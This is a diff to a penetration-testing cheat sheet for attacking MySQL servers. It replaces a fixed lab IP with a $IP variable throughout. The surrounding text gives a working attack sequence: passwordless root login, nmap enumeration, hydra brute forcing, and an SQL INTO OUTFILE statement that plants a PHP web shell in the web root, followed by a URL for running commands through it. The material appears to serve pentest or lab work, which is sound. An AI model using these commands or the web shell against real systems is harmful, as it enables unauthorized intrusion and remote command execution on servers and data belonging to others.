@@ -1,14 +1,14 @@
 # MySQL (3306)
 
 !!! tip "Start here"
-    Try root with no password first: `mysql -h 10.10.10.10 -u root` (no `-p` flag). Many dev and staging instances have no root password set. If you get in and the user has `FILE` privilege, you can write a web shell directly to the web root.
+    Try root with no password first: `mysql -h $IP -u root` (no `-p` flag). Many dev and staging instances have no root password set. If you get in and the user has `FILE` privilege, you can write a web shell directly to the web root.
 
 ---
 
 ## Enumeration
 
 ```bash
-nmap -p 3306 --script mysql-info,mysql-users,mysql-databases 10.10.10.10
+nmap -p 3306 --script mysql-info,mysql-users,mysql-databases $IP
 ```
 
 ---
@@ -16,7 +16,7 @@ nmap -p 3306 --script mysql-info,mysql-users,mysql-databases 10.10.10.10
 ## Authentication
 
 ```bash
-mysql -h 10.10.10.10 -u root
+mysql -h $IP -u root
 sqlcmd -S MSSQL_HOST -U DB_USER -P "DB_PASS" -y 30 -Y 30
 ```
 
@@ -44,7 +44,7 @@ impacket-mssqlclient 'DOMAIN/DB_USER:DB_PASS@MSSQL_HOST' -windows-auth
 ## Brute Force
 
 ```bash
-hydra -L users.txt -P passwords.txt mysql://10.10.10.10
+hydra -L users.txt -P passwords.txt mysql://$IP
 ```
 
 ---
@@ -70,7 +70,7 @@ If the MySQL user has `FILE` privilege, write a web shell:
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
-Access at `http://10.10.10.10/shell.php?cmd=id`.
+Access at `http://$IP/shell.php?cmd=id`.
 
 Dump a table to disk:
 
